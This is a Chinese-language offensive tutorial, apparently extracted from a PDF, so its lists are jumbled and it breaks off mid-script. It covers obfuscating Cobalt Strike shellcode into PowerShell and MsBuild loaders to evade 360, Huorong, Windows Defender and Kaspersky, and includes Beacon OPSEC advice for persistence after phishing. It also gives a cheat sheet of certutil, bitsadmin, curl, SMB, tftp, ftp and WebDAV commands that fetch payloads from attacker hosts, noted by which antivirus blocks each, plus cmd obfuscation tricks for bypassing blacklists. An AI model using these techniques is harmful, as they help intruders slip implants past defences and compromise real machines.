Powershell / MsBuild 免杀上线
分享⼀个前段时间学习测试 Powershell / MsBuild 免杀上线 CS 时写的简单混淆脚本
(Shellcode -> ps1, xml)，结合 CS Profile 可以免杀上线 360、⽕绒、Windows Defender 及 
Kaspersky，脚本主要对脚本中的⼀些特征函数名、变量名及⼀些特征字段等进⾏随机⽣成
替换，Shellcode 逐字节 xor 解密。
混淆脚本代码⻅⽂末或者 https://github.com/inspiringz/python-
toys/blob/master/1.Simple%20Shellcode%20Obfuscation%20Code/ssos.py
Step 1: CS ⽣成 Python 格式的 Payload payload.py，和混淆脚本 ssos.py 放置在同⼀⽬录
下，运⾏ python ssos.py payload.py output_filename 即可⽣成 ps1, xml 格式上线脚本。
Step 2: 在开启 Defender 实时保护 & 云保护的机器上 MsBuild 执⾏ XML 上线 CS。 
Step 3: CS 端成功免杀上线：
2021/07/15 测试的卡巴斯基免杀上线图：
Beacon Commands OPSEC
钓⻥上线后⾸先通过进程列表判断当前机器上有哪些杀软，做好权限持久化后再进⾏⾼危
操作，免得不慎丢失上线的点。
Beacon 中内置的依赖 Win32 API 实现的命令:
cd
cp
download
drives
exit
getprivs
getuid
Beacon 中内置的派⽣进程 + 远程进程注⼊实现的命令，杀软对此类⾏为检测⽐较敏感，为
⾼危操作：
kerberos_ccache_use
kerberos_ticket_purge
kerberos_ticket_use
jobkill
kill
link
ls
make_token
mkdir
mv
ppid
ps
pwd
reg query
reg queryv
rev2self
rm
rportfwd
setenv
socks
steal_token
timestomp
unlink
upload
browserpivot
bypassuac
covertvpn
dcsync
desktop
elevate
execute-assembly
hashdump
keylogger
logonpasswords
mimikatz
net
portscan
powerpick
psinject
pth
Windows ⽂件传输 Cheetsheet
测试杀软（2021.07.16）：
⽕绒（版本 5.0.62.3 / 病毒库 2021-07-12）
•
360 安全卫⼠（版本 13.1.0.1002 / 备⽤⽊⻢库 2021-07-15）
•
卡巴斯基（版本 21.3.10.391b）
•
Windows Defender (反恶意软件客户端版本: 4.18.2106.6 / 引擎版本: 1.1.18300.4 / 防
病毒软件版本: 1.343.1035.0)
•
Powershell Invoke-Web Request
1.
runasadmin
screenshot
shspawn
spawn
ssh
ssh-key
wdigest
Certutil
1.
Bypass 360:
bitsadmin
1.
curl
1.
powershell.exe iwr -uri 192.168.212.1:90/1 -o  x # 360, denfender, kaspersky, 
huorong works
powershell.exe (New-Object 
System.Net.WebClient).DownloadFile('http://192.168.212.1:90/1', 'x') # 
defender, kaspersky, huorong works, 360 kill
certutil -urlcache -f http://192.168.212.1:92/1 x # 360, Kaspersky, Defender 
not works. Huorong works.
certutil -urlcache -f -split http://192.168.212.1:90/1 try # kill
certutil -urlcache -f -split crl delete # works
certutil -urlcache -f -split http://192.168.212.1:90/1 trydelete # works
bitsadmin /transfer name http://192.168.212.1:92/1 C:\Users\nimda\Desktop\x # 
Defender, huorong works，360、Kaspersky kill
wget
1.
smb 445, 139
1.
tftp 69 udp
1.
ftp 20,21 tcp
1.
Webdav
1.
Server:
curl http://192.168.212.1:92/1 -o y # Defender, Kaspersky, 360, Huorong works
curl 192.168.212.1:92/1 -o y
wget 192.168.212.1:92/1 -O y # Win10 默认⽆
# sudo smbserver.py -smb2support share /Users/inspringz/Desktop/hta
copy \\192.168.212.1\share\1 # Defender, Kaspersky, 360, Huorong works
# git clone git://github.com/msoulier/tftpy
# pip install tftpy
# sudo python tftpy_server.py -i 192.168.212.1 -r /Users/inspringz/Desktop/hta
tftp -i 192.168.212.1 GET 1 # not found 
# pip install pyftpdlib
# python -m pyftpdlib -i 0.0.0.0 -p 21 -d .
echo get 1 save | ftp -A 192.168.212.1 # all works
(echo open 192.168.212.1 2121 & echo get 1 savexxx)| ftp -A @ # echo. 空⾏
# Tip: Defender 默认阻⽌所有公⽤⽹络和专⽤⽹络上的 ⽂件传输程序 的某些功能。需要允许访问
# https://github.com/hacdias/webdav
# config.yaml
address: 0.0.0.0
port: 19999
auth: false
scope: .
modify: true
# command
./webdav -c config.yaml
Client:
我们可以结合 Windows 下的⼀些 CMD Tricks 来绕过杀软检测：
忽视任何位置的 ^  ，不能连⽤，不能在末尾。calc.exe -> ^c^a^l^c^.^e^x^e
1.
忽视任何位置的 " ，可多次使⽤，可以在末尾。 calc.exe -> "c"al^"^"c.^e"x"e"
2.
零⻓度环境变量，环境默认不为0，借助“切⽚” :~start,enc 实现，如：
3.
路径分割符 \  or / 及 UNC 路径，以下项效果相同。
4.
通常可以使⽤类似的⽅式来 Bypass ⿊名单，如 powershell -> power^shell.exe , calc.exe 
-> ^"%Localappdata:~-3%^%SystemRoot:~0,1%^"
再⽐如隐蔽启动 Powershell v2 的命令⾏：
这⾥的 ver 前⾯的 -  实际上不是普通的 - ，⽽是 U+2015  Unicode 字符⽔平条，指定使⽤ 
PS 版本 000002.000  ⽽仅仅是 2。
Refence:
net use x: http://1.15.21.238:19999/
copy x:config 
copy file x: # upload
C:\Windows/\//\system32\calc.exe
C:\Windows\system32\calc.exe
\\127.0.0.1\C$\windows\system32\calc.exe
powershell ―v^E^r 00%os:~0,-56%000^2^.0%public:~0,-313%00 
$PSVersionTable.PSVersion
https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-
commands/
•
http://iv4n.cc/NTFS-tricks/
•
ssos.py:
# -*- coding: utf8 -*-
# https://github.com/inspiringz/python-toys
import re
import sys
import random
import string
ps1_template = '''Set-StrictMode -Version 2
function func_b {
    Param ($amodule, $aprocedure)       
    $aunsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | 
Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')
[-1].Equals('System.dll') 